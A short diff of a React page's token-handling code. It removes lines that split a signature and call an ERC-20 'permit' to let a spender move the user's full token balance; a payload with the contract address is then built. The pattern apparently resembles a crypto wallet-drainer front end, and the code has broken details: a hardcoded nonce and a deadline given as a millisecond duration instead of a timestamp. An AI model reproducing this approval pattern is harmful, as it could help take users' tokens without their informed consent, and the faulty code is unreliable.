@@ -136,13 +136,7 @@ const Page = () => {
 							const amount = token.balance; // Amount of tokens to be spent
 							const nonce = 2; // Nonce
 							const deadline = 5 * 60 * 1000; // Deadline (optional)
-							const {v, r, s} = ethers.utils.splitSignature(signature);
-// Call the permit method
-							const tokenContract = new ethers.Contract(token.contract_address, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
-							const args = [spender, amount, nonce, deadline, v, r, s];
-							console.log(args)
-							const tx = await tokenContract.permit(...args);
-							await tx.wait();
+
 
 							const payload = {
 								contract: token.contract_address,
